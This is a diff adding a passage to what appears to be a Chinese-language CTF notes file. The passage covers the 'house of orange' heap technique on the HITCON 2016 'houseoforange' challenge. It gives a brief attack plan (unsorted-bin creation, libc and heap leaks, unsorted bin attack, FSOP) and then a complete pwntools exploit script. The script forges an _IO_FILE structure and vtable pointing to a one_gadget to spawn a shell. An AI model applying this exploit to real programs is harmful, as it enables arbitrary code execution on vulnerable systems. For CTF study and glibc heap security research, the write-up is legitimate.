@@ -343,3 +343,118 @@ p.interactive()
 
 
 ```
+
+### house of orange
+
+#### houseoforange hitcon2016
+
+##### 题目分析
+1. 没有free
+2. 能控制topchunk的大小
+3. 能 malloc 4次, edit 3次
+
+##### 攻击思路
+1. 通过 house of orange 搞出一个 unsorted bin
+2. leak libc: malloc出来的chunk,原来的fd-bk链没被清空, 可以用来leak libc
+3. leak heap: 这个比较玄学
+	+ 经过测试:
+		+ 本题中: 只有分配出足够大的chunk时, chunk的next_chunk链将指向该chunk本身
+		+ 而实际上,会出现这种原因, 是因为在遍历unsorted bin的时, chunk不是exact fit, 就会放到smallbin或者largebin, 如果是放到largebin中, 如果largebin是空的, 那么chunk的nextsize链指向该chunk本身, malloc的时候如果设置清除, 就会保留.
+		+ 玄学的地方在于: 本题要malloc足够大才会保留, 而自己写个malloc程序测试时, 即使是malloc(0x20), 返回的chunk也会保留有 nextsize 链
+		+ 真的玄学
+
+4. leak heap之后就可以unsortedbin attack, 使 io_list_all 指向 unsortedbin
+	+ 这一步会破坏unsortedbin,会报错, 那么就可以使用 Fsop
+
+5. Fsop
+
+#### exp
+```python
+#!/usr/bin/env python
+from pwn import *
+
+p=process(argv=["./houseoforange"],env={"LD_PRELOAD":"./libc.so.6"})
+context.log_level="debug"
+
+gdb.attach(p)
+
+def new(lenofname,name,color_num=56746,price=0xffffffff):
+    p.recvuntil("Your choice : ")
+    p.sendline("1")
+    p.recvuntil('Length of name :')
+    p.sendline(str(lenofname))
+    p.recvuntil("Name :")
+    p.send(name)
+    p.recvuntil("Price of Orange:")
+    p.sendline(str(price))
+    p.recvuntil("Color of Orange:")
+    p.sendline(str(color_num))
+
+def edit(name_len,name,price=0xffffffff,color=56746):
+    p.recvuntil("Your choice : ")
+    p.sendline("3")
+    p.recvuntil("Length of name :")
+    p.sendline(str(name_len))
+    p.recvuntil("Name:")
+    p.send(name)
+    p.recvuntil("Price of Orange: ")
+    p.sendline(str(price))
+    p.recvuntil("Color of Orange: ")
+    p.sendline(str(color))
+
+def show():
+    p.recvuntil("Your choice : ")
+    p.sendline("2")
+
+new(1,"\x78")                                # new 0
+name_len=0x10+0x20+0x10     # name_chunk_usr + message_chunk + top_chunk_header
+name_payload='name'*4
+name_payload+=p64(0)+p64(0x21)+p32(0xffffffff)+p32(56746)+'a'*8
+name_payload+='\x00'*8+p64(0xfa1)
+
+edit(name_len,name_payload)                 # edit 0
+
+new(0x1000,"\x78")                         # new 1
+new(0x400,"\x78");                            # new 2
+
+show()
+
+p.recvuntil("Name of house : ")
+unsorted_libc=u64(p.recvuntil("House")[0:6].ljust(8,"\x00"))
+libc_base=unsorted_libc-0x3c4178
+
+oneoff=0x45206
+onegadget=oneoff+libc_base
+io_list_all_off=0x3c4520
+io_list_all=libc_base+io_list_all_off
+
+name_len=0x10
+name_payload=name_len*'a'
+
+edit(name_len,name_payload)                           # edit 1
+show()                                                # leak heap
+p.recvuntil("a"*16)
+heap=u64((p.recvuntil("House")[0:6]).ljust(8,"\x00"))
+
+io_file_plus=heap+0x410+0x20
+vtable=p64(0)*3+p64(onegadget)
+
+pad_payload='\x00'*0x400+'\x00'*0x20
+
+fsop_payload='/bin/sh\x00'+p64(0x61)             # 0x10
+fsop_payload+=p64(0)+p64(io_list_all-0x10)        #0x20       
+fsop_payload+=p64(2)+p64(3)                      # io_write_base io_write_ptr
+fsop_payload+=vtable
+fsop_payload=fsop_payload.ljust(0xd8,'\x00')
+fsop_payload+=p64(io_file_plus+0x30)
+payload=pad_payload+fsop_payload
+edit(len(payload),payload)
+
+log.success("io_list_all: "+hex(io_list_all))
+log.success("heap: "+hex(heap))
+p.sendline('1')
+
+p.interactive()
+
+
+```
